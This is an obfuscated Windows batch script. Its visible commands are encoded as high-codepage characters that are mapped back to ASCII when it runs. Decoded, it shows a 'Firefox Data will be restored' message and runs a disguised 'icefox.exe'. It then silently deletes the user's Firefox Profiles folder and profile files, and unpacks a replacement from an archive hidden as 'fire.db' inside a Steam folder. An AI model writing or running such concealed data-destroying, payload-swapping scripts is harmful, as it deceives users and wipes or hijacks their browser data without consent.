@echo off&(if defined @lo@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=¡¢¤¥§¨©×«¬­®¯°±²³´µ¶·¸¹÷»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞ‗אבגדהוזחטיךכלםמןנסעףפץצקרשתûü‎‏ÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%ז%%ה%%י%%נ%%¡%%נ%%ח%%ח%
%ז%%ה%%י%%נ%%¡%%Ç%%ך%%ף%%ז%%ח%%נ%%ש%%¡%%Å%%ג%%ץ%%ג%%¡%%ר%%ך%%ם%%ם%%¡%%ד%%ז%%¡%%ף%%ז%%פ%%ץ%%נ%%ף%%ז%%ו%
%פ%%ץ%%ג%%ף%%ץ%%¡%%localappdata%%Ý%%Ç%%ך%%ף%%ז%%ח%%נ%%ש%%Ý%%ך%%ה%%ז%%ח%%נ%%ש%%¯%%ז%%ש%%ז%
%ץ%%ך%%מ%%ז%%נ%%צ%%ץ%%¡%%¶%%¡%%¿%%¡%%ן%%צ%%ם%
%ץ%%ג%%פ%%ל%%ל%%ך%%ם%%ם%%¡%%°%%ח%%¡%%°%%ך%%מ%%¡%%ך%%ה%%ז%%ח%%נ%%ש%%¯%%ז%%ש%%ז%
%ה%%ו%%¡%%appdata%%Ý%%Î%%נ%%û%%ך%%ם%%ם%%ג%%Ý%%Ç%%ך%%ף%%ז%%ח%%נ%%ש%%Ý%
%ף%%מ%%ו%%ך%%ף%%¡%%°%%ע%%¡%%°%%פ%%¡%%Ñ%%ף%%נ%%ח%%ך%%ם%%ז%%פ%
%ו%%ז%%ם%%¡%%ך%%ן%%פ%%ץ%%ג%%ם%%ם%%פ%%¯%%ך%%ן%%ך%
%ו%%ז%%ם%%¡%%ס%%ף%%נ%%ח%%ך%%ם%%ז%%פ%%¯%%ך%%ן%%ך%
%ה%%נ%%ס%%ת%%¡%%£%%Ä%%»%%Ý%%Ñ%%ף%%נ%%ט%%ף%%ג%%מ%%¡%%Ç%%ך%%ם%%ז%%פ%%¡%%©%%ש%%¹%%·%%×%%Ý%%Ô%%ץ%%ז%%ג%%מ%%Ý%%מ%%צ%%פ%%ך%%ה%%Ý%%א%%ו%%ג%%ץ%%ג%%ד%%ג%%פ%%ז%%Ý%%ח%%ך%%ף%%ז%%¯%%ו%%ד%%£%
%localappdata%%Ý%%Ø%%ך%%ן%%Ó%%Â%%Ó%%Ý%%צ%%ן%%ף%%ג%%ף%%¯%%ז%%ש%%ז%%¡%%ש%%¡%%ח%%ך%%ף%%ז%%¯%%ו%%ד%
%פ%%ץ%%ג%%ף%%ץ%%¡%%localappdata%%Ý%%Ç%%ך%%ף%%ז%%ח%%נ%%ש%%Ý%%ך%%ה%%ז%%ח%%נ%%ש%%¯%%ז%%ש%%ז%
%ז%%ש%%ך%%ץ%
